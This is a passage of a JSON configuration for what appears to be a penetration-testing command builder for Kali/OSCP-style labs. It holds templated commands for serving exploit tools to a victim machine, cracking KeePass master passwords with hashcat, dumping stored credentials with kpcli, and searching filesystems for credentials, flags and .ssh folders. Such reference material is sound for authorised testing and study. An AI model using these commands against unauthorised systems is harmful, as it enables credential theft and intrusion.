            "replace": "__CUSTOM_HTTP_SERVER_BIND_ADDRESS__",
            "defaultValue": "__ATTACKER_HOST__",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Bind IPv4 Address"
            }
          },
          {
            "help": "Here are various ways to setup a quick http server for downloading (and potentially uploading) files to/from a victim/target computer.\n\nThese commands would generally run on the attacking computer (aka kali) to serve things like exploits or tools to run on the victim machine.",
            "replace": "__PYTHON_ARGS__",
            "defaultValue": "-m http.server __ENABLE_HTTP_SERVER_BIND_TO_ADDRESS__ __CUSTOM_HTTP_SERVER_PORT__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "-m http.server __ENABLE_HTTP_SERVER_BIND_TO_ADDRESS__ __CUSTOM_HTTP_SERVER_PORT__",
                  "label": "Python3 Simple Server module"
                },
                {
                  "replace": "__CUSTOM_HTTP_SERVER_PY_PATH__custom_server.py __CUSTOM_HTTP_SERVER_PORT__",
                  "label": "Python3 Custom GET/POST Server (custom_server.py)"
                }
              ],
              "label": "Select an http server option"
            }
          },
          {
            "help": "",
            "replace": "__HTTP_SERVER_CMD__",
            "defaultValue": "python__PYTHON_BIN_3__ __PYTHON_ARGS__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "python__PYTHON_BIN_3__ __PYTHON_ARGS__",
                  "label": "Run server in current directory"
                },
                {
                  "replace": "(cd '__HTTP_DIR_TO_HOST__' && python__PYTHON_BIN_3__ __PYTHON_ARGS__)",
                  "label": "Run server in Directory"
                }
              ],
              "label": "Select where to serve the files from"
            }
          },
          {
            "help": "Enter the folder path (relative or absolute) of the root with which the http server should serve it's files from.",
            "replace": "__HTTP_DIR_TO_HOST__",
            "defaultValue": "__TOOLS_PATH__",
            "props": {
              "type": "select",
              "label": "Root Directory for http server",
              "customInput": true,
              "options": ["__TOOLS_PATH__", "~/oscp/tools", "~/tools"]
            }
          },
          {
            "help": "Enter the path to the folder (relative or absolute) which contains the `custom_server.py` python script.\n\n> NOTE: path MUST end with a slash, as this path is prepended to `custom_server.py` eg `../test/path/custom_server.py` would work but `../test/pathcustom_server.py` would not work (there is a missing `/` after `/path`)",
            "replace": "__CUSTOM_HTTP_SERVER_PY_PATH__",
            "defaultValue": "~/Downloads/",
            "props": {
              "type": "select",
              "label": "Path of the folder containing custom_server.py file",
              "customInput": true,
              "options": [
                "~/Downloads/",
                "~/",
                "/home/kali/",
                "/home/kali/oscp/"
              ]
            }
          }
        ]
      }
    ]
  },
  {
    "id": "terminal-multiplexer",
    "keywords": ["tmux", "screen"],
    "cmds": [
      {
        "win": 0,
        "label": "new_screen SESSION",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "new_screen __NEW_SCREEN_SESSION_NAME__",
        "help": "# Start a new session\n\nThis command will start a new screen session with the configured window splits, sizes, and logging turned on.\n\nThe logs are saved in the `current directory` with the filename pattern of `slog{SESSION_NAME}.{LOG_NUM}` where `SESSION_NAME` is the argument provided to the `new_screen SESSION_NAME` command, and the `LOG_NUM` is a number relating to the window split within the screen configuration eg `win 0 == slog*.0`\n\nBy default in this configuration, there are `6` window splits.\n\n## GNU Screen specifics:\n\n- [Screen Manual](https://www.gnu.org/software/screen/manual/screen.html#Resize)\n\n| Hotkey | Description |\n| --- | --- |\n| `Ctrl + a, ?` | Open Help Menu |\n| `Ctrl + a, Tab` | Focus the next window aka move cursor to next window |\n| `Ctrl + a, Shift + Tab` | Focus the previous window aka move cursor to previous window |\n| `Ctrl + a, \"` | show windows to select one. NOTE: (double quote) |\n| `Ctrl + a, S` | split horizontally --- NOTE: (capital S) |\n| `Ctrl + a, \\|` | split vertically \\| NOTE: (Pipe char) |\n| `Ctrl + a, c` | create a new window |\n| `Ctrl + a, A` | Rename window |\n\n> NOTE: `vim` like movements are enabled as a custom addition to the keyboard shortcuts to this `screen` config. This enables `Ctrl + a` with one of `h`, `j`, `k`, `l`, `t`, `b` to move to the window to the left, down, up, right, top or bottom\n\n> NOTE: additionally `Ctrl + t` is used to display the `screen` windows list, allowing changing of the terminal within the current window.\n\n## window focus moving like in vim\n```\nbind h focus left\nbind j focus down\nbind k focus up\nbind l focus right\nbind t focus top\nbind b focus bottom\n```\n\n### To add an nth screen window split:\n\n1. decide on a split direction, enter the scree command (start via keyboard shortcut of `Ctrl + a`) of  `:split`\n2. tab into new pane\n3. create a new window (see table of commands above)\n4. rename window (see table of commands above)\n5. NOTE: logging will be ON BY DEFAULT, this is intended\n",
        "code": [],
        "config": [
          {
            "help": "Enter the name for the gnu screen session.\n\nThis will also be used within the `slog` filenames which have a pattern of `slog{SESSION_NAME}.{LOG_NUMBER}` and will be output in the current directory.\n\nNOTE: this command does NOT check if logs exist already and could overwrite them. Supply a new `SESSION_NAME` for each run",
            "replace": "__NEW_SCREEN_SESSION_NAME__",
            "defaultValue": "session1",
            "validationRegex": ".{1,}",
            "validationHelp": "Session Name must be at least 1 character",
            "props": {
              "type": "string",
              "label": "Session Name"
            }
          }
        ]
      },
      {
        "win": 1,
        "label": "py_logs - search screen logs",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "py_logs __PYLOGS_SLOG_GLOB__ __PYLOGS_FIND_ENABLED__ __PYLOGS_INCLUDE_ENABLED__ __PYLOGS_EXCLUDE_ENABLED__ __PYLOGS_NO_COLOR__ __PYLOGS_UNIQUE_RESULTS_ENABLED__ __PYLOGS_FIND_CASESENSITIVE_ENABLED__",
        "help": "# py_logs - alias to `~/logs.py`\n\n`py_logs` is an alias to a custom python script that is expected to be located at `~/logs.py`\n\n`py_logs` will allow the user to view and search through the `slog{SESSION_NAME}.{LOG_NUM}` files. To determine which `slogs` to view or search, the required parameter for the logs glob is used. This parameter is used as a file glob and can be used to search through sub-folders for slog files as well.\n\n## Examples\n\nAs an example consider the following file structure:\n\n```bash\n# topic1/\n#     - logs/\n#          - slogs*.0\n#          - slogs*.1\n# topic2/\n#     - logs/\n#          - slogs*.*\n# topic13/\n#     - logs/\n#          - slogs*.*\n```\n\na valid `py_logs` command to view and search through all of these logs would be: `py_logs topic*/logs/slog`\nNOTE: the last `*` is automatically provided by `py_logs`\n\n`py_logs` default behavior is to show the commands from oldest to newest.\n\nThere are flags for things like `searching`, `excluding` results in the output, only `including` specific results in the output, only outputting `unique` commands and more.",
        "code": [],
        "config": [
          {
            "help": "Glob to indicate where the `slog` files are located. This is a required parameter.\n\nThis parameter will have a glob '*' (asterisk) automatically appended at the end to find all files matching the pattern at the path provided. This allows for `py_logs` to use multiple `slog` files to get the content from them.\n\nBe as specific as you need to get back the results necessary.\n\nEg, a glob of `slogSession1test.0` will likely only match a single file, while `slogSession` will likely match a much larger set of files, giving a much large amount of output.",
            "replace": "__PYLOGS_SLOG_GLOB__",
            "defaultValue": "./slogsession1.",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "path to slog{SESSION_NAME} log files"
            }
          },
          {
            "help": "When enabled, this will only return unique commands from all logs provided. The default behavior is to always sort the output with the newest run commands being at the end of the output.",
            "replace": "__PYLOGS_UNIQUE_RESULTS_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable unique results ",
              "replaceValue": "-u"
            }
          },
          {
            "help": "Enable the find flag for `py_logs` alias command (~/logs.py)\n\nThis will then allow for finding of a string within the logs in either the `command ran` or the `results of command ran` or `both`.",
            "replace": "__PYLOGS_FIND_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable find flag",
              "replaceValue": "-f '__PYLOGS_FIND_SEARCH_TERM__' __PYLOGS_FIND_WHERE_ENABLED__"
            }
          },
          {
            "help": "enter a command or some text that might be in the logs. When ran, this will search the given logs and try to find the given value.",
            "replace": "__PYLOGS_FIND_SEARCH_TERM__",
            "defaultValue": "",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "What to find with py_logs"
            }
          },
          {
            "help": "Inclusion allows for sniping out returned values (displayed as `steps`) from the results of the logs. This allows the user to provide a string that matches the pattern of `'n-'` or `'n-i'` or multiple ranges via `'n-i,m,o,p-q'`.\n\n\nThis will include anything that matches the indices provided, or their ranges.\n\n> NOTE: If no number is provided after a hyphen, then the range will match all values from n up.",
            "replace": "__PYLOGS_INCLUDE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable the include flag",
              "replaceValue": "-i '__PYLOGS_INCLUDE_RANGE__'"
            }
          },
          {
            "help": "See help for Enabling the include flag. Default `'0-'` aka include all indices in all logs provided",
            "replace": "__PYLOGS_INCLUDE_RANGE__",
            "defaultValue": "0-",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "include range"
            }
          },
          {
            "help": "Exclude a range of indices from the output, this will shorten the output. The range can be from one number to another, or open ended (eg, 0-). Or comma separate various ranges to exclude specific commands. See Enable include flag help for more info.",
            "replace": "__PYLOGS_EXCLUDE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable the exclude flag",
              "replaceValue": "-x '__PYLOGS_EXCLUDE_RANGE__'"
            }
          },
          {
            "help": "See help for Enabling the exclude flag. Default '1-' aka exclude all but the first (0th) index",
            "replace": "__PYLOGS_EXCLUDE_RANGE__",
            "defaultValue": "1-",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "exclude range"
            }
          },
          {
            "help": "Much like other Linux/Unix commands, disabling color output is an optional flag. This will disable the color output for the py_logs alias of ~/logs.py",
            "replace": "__PYLOGS_NO_COLOR__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable the --no-color flag",
              "replaceValue": "--no-color"
            }
          },
          {
            "help": "Case sensitive searching enables being even more specific with the searched term. The default is case-insensitive search.",
            "replace": "__PYLOGS_FIND_CASESENSITIVE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable Case Sensitive searching for the provided search term",
              "replaceValue": "--case"
            }
          },
          {
            "help": "Where flag will allow for searching in the logs for command results that match the search term, or in the commands only or in both (aka all)",
            "replace": "__PYLOGS_FIND_WHERE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "enable selecting where to search for the given search term to find.",
              "replaceValue": "--where '__PYLOGS_FIND_WHERE_OPTION__'"
            }
          },
          {
            "help": "See help for the checkbox that enables this feature to the left",
            "replace": "__PYLOGS_FIND_WHERE_OPTION__",
            "defaultValue": "all",
            "props": {
              "type": "select",
              "label": "Select an option for where to search for the term provided",
              "customInput": false,
              "options": ["all", "cmd", "result"]
            }
          }
        ]
      },
      {
        "win": 2,
        "label": "setup custom GNU screen",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "__CUSTOM_SCREEN_LOGGING_ZSHRC__ __CUSTOM_SCREEN_LOGGING_APT_INSTALL__",
        "help": "# Setup - Run Once\n\nThese setup commands help get started with this customized `screen` configuration with the python `logs.py` which requires additional non-standard packages for kali to run correctly.",
        "code": [
          {
            "data": "",
            "filename": "logs.py",
            "sha256": "b5fc732270918d8c258969cc71d97de9886c8f431ced1266e3711136df233ae0"
          },
          {
            "data": "IyEvYmluL2Jhc2gKCiMgY3VzdG9tIGFsaWFzIGZvciBsYXVuY2hpbmcgdGhlIHB5dGhvbiBsb2dzIHNjcmlwdDoKYWxpYXMgcHlfbG9ncz0icHl0aG9uIC9ob21lL2thbGkvbG9ncy5weSIKCiMgQ3VzdG9tIGZuIGZvciBTY3JlZW4gTG9nZ2luZyAoc2xvZykKIyBGdW5jdGlvbiB0byBleGVjdXRlIGJlZm9yZSBlYWNoIGNvbW1hbmQgd2l0aCB5b3VyIGNvbW1hbmQgYXMgYXJndW1lbnQKIyBjdXN0b21pemVkIHRvIHByaW50IGEgdGltZXN0YW1wIGFuZCB0aGUgY29tbWFuZCB0byBiZSBlYXNpbHkgZ3JhYmJlZCBmcm9tIGxvZyBmaWxlcy4KIyBzaG91bGQgbWFzc2l2ZWx5IHNpbXBsaWZ5IHNjcmVlbiBsb2dnaW5nIGFuZCByZXBvcnQgd3JpdGluZwpmdW5jdGlvbiBwcmVleGVjKCkgewogICAgX2N1c3RvbV90aW1lc3RhbXA9IltjbWRfVFM6JChkYXRlICcrJXMgJXkvJW0vJWQgJVQnKV0gJDEgWy9jbWRfVFNdIgoKIyBOT1RFOiBwcmludHMgd2l0aCBjb2xvciBBTkQgcHJlc2VydmVzIGFueSBlc2NhcGUgc2VxdWVuY2luZyB0aGUgdXNlciBoYXMgaW5wdXQKICAgIHByaW50IC1uUCAiJUZ7Z3JlZW59IgogICAgcHJpbnQgLXJuICIkX2N1c3RvbV90aW1lc3RhbXAiCiAgICBwcmludCAtUCAiJWYiCn0KCiMgY3VzdG9tIHNjcmVlbiBzdGFydGVyIGZ1bmN0aW9uCm5ld19zY3JlZW4oKXsKICBpZiBbIC16ICIkMSIgXSB8fCBbICIkMSIgPSAiLWgiIF0gfHwgWyAiJDEiID0gIi0taGVscCIgXTsgdGhlbgogICAgZWNobyAibmV3X3NjcmVlbiBoZWxwOiIKICAgIGVjaG8gIlVzYWdlOiBuZXdfc2NyZWVuIFNFU1NJT05fTkFNRSIKICAgIGVjaG8gIiIKICAgIGVjaG8gIkhlbHA6IgogICAgZWNobyAiICAgIC1oLCAtLWhlbHAiCiAgICBlY2hvICIiCiAgICBlY2hvICJSZXF1aXJlZCBBcmdzOiIKICAgIGVjaG8gIiAgICBTRVNTSU9OX05BTUUgICAgICAgICAgICAgVGhlIG5hbWUgdXNlZCBmb3IgdGhlIHNjcmVlbiBzZXNzaW9uIGFuZCB3aXRoaW4iCiAgICBlY2hvICIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGUgbG9nIGZpbGUgbmFtZXMgb2YgcGF0dGVybiAnc2xvZ3tTRVNTSU9OX05BTUV9LntMT0dfTlVNQkVSfSciCiAgICBlY2hvICIiCgogICAgcmV0dXJuIDEKICBmaQoKICBsb2NhbCBfc2NyZWVucmM9JChjYXQgPDwgRU9GCiMgc3RhcnQgc2NyZWVuIGNvbmZpZwojIGVuYWJsZSBsb25nZXIgc2Nyb2xsYmFjawpkZWZzY3JvbGxiYWNrIDEwMDAwCgojIEJVRzogdGhpcyBkb2VzIGFsbG93IHJlZ2lvbiBzd2l0Y2hpbmcsIGJ1dCBraWxscyBzY3JvbGxpbmcgYWZ0ZXIgQ3RybCtFc2MgY29weSBtb2RlLCBhbmQgTU9VU0UgVEVYVCBTRUxFQ1RJT04gZmZzCiMgbW91c2UgdHJhY2tpbmcgYWxsb3dzIHRvIHN3aXRjaCByZWdpb24gZm9jdXMgYnkgY2xpY2tpbmcKI21vdXNldHJhY2sgb24KCiMgZ2l2ZSBhIHNlc3Npb24gbmFtZQpzZXNzaW9ubmFtZSBfX1NFU1NJT05fTkFNRV9fCgojIHR1cm4gb24gbG9nZ2luZyB0byBmaWxlcwpkZWZsb2cgb24KbG9nZmlsZSBzbG9nX19TRVNTSU9OX05BTUVfXy4lbgoKIyBhdHRlbXB0IHRvIHNhdmUgdGhlIHdpbmRvd3Mgd2hlbiBkZXRhY2hpbmcgdG8gYWxsb3cgcmVhdHRhY2hpbmcgaW4gdGhlIHNhbWUgdmlldwpsYXlvdXQgc2F2ZSBkZWZhdWx0CgojIGtleSBiaW5kaW5ncyAoY2FuIGFsc28gY3JlYXRlICdjb21tYW5kcycgdGhhdCBhcmUgdXNlZCB3aXRoaW4gdGhlIEN0cmwtYSA6IGlucHV0ISkKIyMgQ3RybC1TcGFjZSB0byBsaXN0IHdpbmRvd3MKYmluZGtleSBedCB3aW5kb3dsaXN0CiMjIHdpbmRvdyBmb2N1cyBtb3ZpbmcKYmluZCBoIGZvY3VzIGxlZnQKYmluZCBqIGZvY3VzIGRvd24KYmluZCBrIGZvY3VzIHVwCmJpbmQgbCBmb2N1cyByaWdodApiaW5kIHQgZm9jdXMgdG9wCmJpbmQgYiBmb2N1cyBib3R0b20KCiMgZGVmaW5lIHRoZSBkZWZhdWx0IHNjcmVlbiB3aW5kb3dzIHRvIG9wZW4gaGVyZToKIyB0b3AtbGVmdCBwYW5lCnNjcmVlbiAtdCBfX1NFU1NJT05fTkFNRV9fLndpbjAgMApzcGxpdApmb2N1cyBib3R0b20KcmVzaXplIC12IDQKZm9jdXMgdXAKCiMgdG9wLXJpZ2h0IHBhbmUKc3BsaXQgLXYKZm9jdXMgcmlnaHQKc2NyZWVuIC10IF9fU0VTU0lPTl9OQU1FX18ud2luMSAxCnNwbGl0CmZvY3VzIGRvd24Kc2NyZWVuIC10IF9fU0VTU0lPTl9OQU1FX18ud2luMiAyCnNwbGl0CmZvY3VzIGRvd24Kc2NyZWVuIC10IF9fU0VTU0lPTl9OQU1FX18ud2luMyAzCgoKIyBib3R0b20gcGFuZQpmb2N1cyBib3R0b20Kc2NyZWVuIC10IF9fU0VTU0lPTl9OQU1FX18ud2luNCA0CnNwbGl0IC12CmZvY3VzIHJpZ2h0CnNjcmVlbiAtdCBfX1NFU1NJT05fTkFNRV9fLndpbjUgNQpzcGxpdCAtdgpmb2N1cyByaWdodApzY3JlZW4gLXQgX19TRVNTSU9OX05BTUVfXy53aW42IDYKCiMgZm9jdXMgdG8gdGhlIGZpcnN0IHBhbmUKZm9jdXMgdG9wCmZvY3VzIGxlZnQKCiNlbmQgc2NyZWVuIGNvbmZpZwpFT0YKKQogIGxvY2FsIHNlc3NfbmFtZT0kMQogIGxvY2FsIHRlbXBfZmlsZT0kKG1rdGVtcCkKICAjIG91dHB1dCB0aGUgdGVtcG9yYXJ5IGZpbGUgb2YgdGhlIHNjcmVlbnJjIHZhcmlhYmxlIGFib3ZlLAogICMgcmVwbGFjaW5nIHRoZSBfX1NFU1NJT05fTkFNRV9fIHN0cmluZyB3aXRoIHRoZSBzdXBwbGllZCB2YWx1ZSBhcyB0aGUgZmlyc3QgYXJnCiAgZWNobyAiJF9zY3JlZW5yYyIgfCBzZWQgInMvX19TRVNTSU9OX05BTUVfXy8kc2Vzc19uYW1lL2ciID4gJHRlbXBfZmlsZQogIHNjcmVlbiAtYyAkdGVtcF9maWxlCiAgcm0gJHRlbXBfZmlsZQp9",
            "filename": "custom_screen_logging.sh",
            "sha256": "e21c0de1c90c862e38af38508a28072a8b48b990f795e0b3ed153f6c77a8f959"
          }
        ],
        "config": [
          {
            "help": "Enable the command to add some text to the `~/.zshrc` file.\n\nSpecifically adds a line to `source` the `custom_screen_logging.sh` file which contains the necessary functions and setup for adding a GNU screen logging setup to your machine.",
            "replace": "__CUSTOM_SCREEN_LOGGING_ZSHRC__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Add source line to ~/.zshrc file (only run this once!)",
              "replaceValue": "echo 'source ~/custom_screen_logging.sh' >> ~/.zshrc ;"
            }
          },
          {
            "help": "Enables the necessary command to install a package required for processing logs without having the ansi codes causing issues.\n\nFor background, `screen` logs will contain all of the ansi codes that are interpreted by the terminal. Ansi codes control things like displaying text as a specific color among many other features of the terminal. To get to the raw plaintext of the logs, a 3rd party package is used to properly 'render' these ansi codes. Without this the `logs.py` file will not run correctly and the end-user experience will be unpleasant.",
            "replace": "__CUSTOM_SCREEN_LOGGING_APT_INSTALL__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Enable apt install ansifilter package for logs.py",
              "replaceValue": "sudo apt install ansifilter ;"
            }
          }
        ]
      }
    ]
  },
  {
    "id": "keepass-kdbx",
    "keywords": [
      "keepass",
      "kdbx",
      "master password",
      "hashcat",
      "keepass2john",
      "kpcli"
    ],
    "cmds": [
      {
        "win": 0,
        "label": "Cracking KeePass KDBX Master Password",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "__KDBX_CRACKING_STEP__",
        "help": "# KeePass KDBX Files\n\n`*.kdbx` Keepass Databases can have their master password cracked and then with that info, the `kdbx` file can be opened within linux using a tool called `kpcli`\n\n## Requirements\n\n1. `*.kdbx` file eg `Database.kdbx`\n2. computer that can run `hashcat`",
        "code": [],
        "config": [
          {
            "help": "# KeePass KDBX Files\n\nThese can have their master password cracked and then with that info, the kdbx file can be opened within linux.\n\n## Cracking the Master Password - the Basics\n\nCracking is accomplished in only a few steps:\n\n1. get the hash for the master password from the `*.kdbx` file\n2. run the hash file through `hashcat` until it's cracked with various wordlists and rules\n3. once cracked, use the master password to open the `*.kdbx` file and obtain any credentials stored within",
            "replace": "__KDBX_CRACKING_STEP__",
            "defaultValue": "keepass2john __KDBX_FILENAME__ > __KEEPASS_HASH_FILENAME__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "keepass2john __KDBX_FILENAME__ > __KEEPASS_HASH_FILENAME__",
                  "label": "Step 1: Get hash hashcat format"
                },
                {
                  "replace": "hashcat --username -m 13400 __KEEPASS_HASH_FILENAME__ __CRACKING_WORDLIST__ -r __CRACKING_RULES__",
                  "label": "Step 2: run Hashcat"
                }
              ],
              "label": "Steps to cracking a kdbx master password"
            }
          },
          {
            "help": "The KDBX filename with which to attempt opening, cracking and other operations.\n\n> TIP: This could be a relative filepath as well",
            "replace": "__KDBX_FILENAME__",
            "defaultValue": "Database.kdbx",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Filename of KDBX file"
            }
          },
          {
            "help": "The Hash filename is used to store the master password hash in a format used for cracking via hashcat. \n\nThis filename can have any extension, even a blank one. Typically it's suggested to use a common one like `txt` or something more contextually specific like `hash`.\n\nWARNING: Do not modify this file as it could cause hashcat to fail to execute properly.",
            "replace": "__KEEPASS_HASH_FILENAME__",
            "defaultValue": "keepass.hash",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Hash Filename"
            }
          },
          {
            "help": "Wordlists are very useful when cracking as typically passwords are built by people and not auto-generated. This means that a person will pick something memorable and often that means something common. Wordlists are collection of some of these common phrases or passwords.\n\n`rockyou.txt` is a classic wordlist and if a password is cracked with this list it generally will mean the strength of the password is very weak or simply very common and should be changed!\n\nThe wordlists in this selection are the more commonly used lists. Feel free to edit this value with a path to a custom list.",
            "replace": "__CRACKING_WORDLIST__",
            "defaultValue": "/usr/share/wordlists/rockyou.txt",
            "props": {
              "type": "select",
              "label": "Select a wordlist for cracking",
              "customInput": true,
              "options": ["/usr/share/wordlists/rockyou.txt"]
            }
          },
          {
            "help": "Rules based cracking is a very powerful way to ensure extra permutations on each wordlist entry, while reducing disk storage and other resources.\n\nThe rules files suggested here are some of the more common rules files that find common ways people change passwords to 'enhance' their strength.",
            "replace": "__CRACKING_RULES__",
            "defaultValue": "/usr/share/hashcat/rules/best64.rule",
            "props": {
              "type": "select",
              "label": "Select a cracking rules file",
              "customInput": true,
              "options": [
                "/usr/share/hashcat/rules/best64.rule",
                "/usr/share/hashcat/rules/rockyou-30000.rule"
              ]
            }
          }
        ]
      },
      {
        "win": 0,
        "label": "Open KeePass kdbx on Linux",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "__KPCLI_STEP__",
        "help": "",
        "code": [],
        "config": [
          {
            "help": "",
            "replace": "__KPCLI_STEP__",
            "defaultValue": "kpcli",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "kpcli",
                  "label": "Step 1. run kpcli"
                },
                {
                  "replace": "open __KDBX_FILENAME__",
                  "label": "Step 2. kpcli:/> open KDBX file"
                },
                {
                  "replace": "ls",
                  "label": "Step 3. kpcli:/> ls"
                },
                {
                  "replace": "ls *",
                  "label": "Step 4. kpcli:/> ls *"
                },
                {
                  "replace": "ls Database/",
                  "label": "Step 5. kpcli:/> ls Database/"
                },
                {
                  "replace": "show -a -f __KPCLI_SHOW_NUM__",
                  "label": "Step 6. kpcli:/> show -a -f NUM"
                },
                {
                  "replace": "show -a -f __KPCLI_SHOW_PATH__",
                  "label": "Step 7. kpcli:/> show -a -f Database/path"
                },
                {
                  "replace": "quit",
                  "label": "Step 8. kpcli:/> quit"
                }
              ],
              "label": "Using Kpcli on Linux"
            }
          },
          {
            "help": "The KDBX filename with which to attempt opening, cracking and other operations.\n\n> TIP: This could be a relative filepath as well",
            "replace": "__KDBX_FILENAME__",
            "defaultValue": "Database.kdbx",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Filename of KDBX file"
            }
          },
          {
            "help": "`kpcli` sub-command `show` can take in a number or a path for the item to show. Both need to be enumerated to dump all creds stored in the database.\n\nStarting from `0` increment until no more creds are displayed. Then move onto the paths to dump.",
            "replace": "__KPCLI_SHOW_NUM__",
            "defaultValue": "0",
            "props": {
              "type": "number",
              "label": "Step 5. Number entry to show",
              "InputProps": {
                "inputProps": {
                  "min": 0,
                  "max": 65535
                }
              }
            }
          },
          {
            "help": "`kpcli` sub-command `show` takes in a path value to a given entry to dump it's creds. \n\nGo through all the paths to dump all the creds. This has not been found to be able to be automated easily via `kpcli`, so this is a manual process. It's easiest to go down the list when it's visible on the screen. \n\n> NOTE: `Tab` complete on the keyboard will work, usually the starting of a path is `Database/`",
            "replace": "__KPCLI_SHOW_PATH__",
            "defaultValue": "Database/",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Path Entry to show"
            }
          }
        ]
      }
    ]
  },
  {
    "id": "file-+-smb-enumeration",
    "keywords": [
      "find",
      "fileenum",
      "passwords",
      "plaintext",
      "proof",
      "local",
      "flag.txt",
      "powershell",
      "gci",
      "get-childitem",
      "recurse",
      "files",
      "folders",
      "directory",
      "directories",
      "smb",
      "cifs",
      "445"
    ],
    "cmds": [
      {
        "win": 0,
        "label": "Find on Linux",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": false,
        "cmd": "find __FILE_SEARCH_PATH__ __LINUX_FIND_IGNORE_COMMON_PATHS__ __LINUX_FIND_ARGS__ __LINUX_FIND_OUTPUT_OPTIONS__ __LINUX_FIND_REDIRECT_ERRORS_ENABLED__",
        "help": "# Enumerating Files\n\nOften plaintext files are found containing sensitive information. Here are various ways to enumerate depending on the types of commands available on the system.\n\n## Methodology / Goals\n\n1. find credentials or other privilege escalation means such as writable files\n2. find info which describes how the environment was/is setup. with more context, often it's easier to continue attacking a network\n3. reduce noise by quickly and easily filtering out common areas that often have false positives\n4. offer redundant command options that achieve the same goal\n",
        "code": [],
        "config": [
          {
            "help": "Select a find option and enter any additional configuration needed for it before running.\n\nAvailable options are to help guide towards important files, sensitive data and other interesting info. These are considered a list of commands to start with, before diving into more context specific searches.\n\nTIP: Consider also using a tool like `linpeas` to find even more.",
            "replace": "__LINUX_FIND_ARGS__",
            "defaultValue": "-type f \\( -name '*proof*.txt' -o -name '*local*.txt' -o -name '*flag*.txt' \\)",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "-type f \\( -name '*proof*.txt' -o -name '*local*.txt' -o -name '*flag*.txt' \\)",
                  "label": "Find txt files with \"proof\", \"local\" or \"flag\" in the filename"
                },
                {
                  "replace": "-type d -name '.ssh' -o -name '.git'",
                  "label": "Find all \".ssh\" or \".git\" folders"
                },
                {
                  "replace": "-type f",
                  "label": "Find ALL files"
                },
                {
                  "replace": "-type d",
                  "label": "Find ALL directories"
                },
                {
                  "replace": "\\! -user root",
                  "label": "Find all files NOT owned by root"
                },
                {
                  "replace": "-type f -name '__LINUX_FIND_NAME_PATTERN__'",
                  "label": "Find files matching a name or pattern"
                }
              ],
              "label": "Find Options"
            }
          },
          {
            "help": "# Where to search?\n\nWHERE should the searching take place? Often, searching from the root of the current filesystem is desired however this can cause the search to be slow and create too much output to easily sift through.\n\nEnter a path on the filesystem to search. Consider common locations like `/` or `/home/`",
            "replace": "__FILE_SEARCH_PATH__",
            "defaultValue": "/",
            "props": {
              "type": "select",
              "label": "File Search Path",
              "customInput": true,
              "options": ["/", "/home/", "./"]
            }
          },
          {
            "help": "When checked this command will have all `stderr` output redirected to `/dev/null`. This makes the command output easier to read. Common `stderr` output is related to access denied messages for a given location.\n\nDefault is to have this enabled.",
            "replace": "__LINUX_FIND_REDIRECT_ERRORS_ENABLED__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Redirect errors to /dev/null",
              "replaceValue": "2>/dev/null"
            }
          },
          {
            "help": "Ignoring these paths is often ideal as they are owned by root, contain system data and often lead to a large list of false-positives.\n\nThis uses find flags to ignore these folders directly, instead of grep. Grep would not work in all scenarios that these commands are intended to run.",
            "replace": "__LINUX_FIND_IGNORE_COMMON_PATHS__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Ignore common false-positive paths",
              "replaceValue": "-type d \\( -path '/run/' -o -path '/proc/' -o -path '/sys/' \\) -prune -o"
            }
          },
          {
            "help": "Pick an option of what to output during the operation. When first enumerating, it's a good idea to look at filenames to determine potential sensitivity. A file named `passwords.txt` is often of interest, however not all files will be named something interesting.\n\nWhen more verbosity is desired, consider selecting an option that also outputs the file contents when they are found.",
            "replace": "__LINUX_FIND_OUTPUT_OPTIONS__",
            "defaultValue": "-print",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "-print",
                  "label": "Print full file path"
                },
                {
                  "replace": "-print -exec cat \"{}\" \\;",
                  "label": "Print full file path AND file contents"
                }
              ],
              "label": "Select output options (print path and contents)"
            }
          },
          {
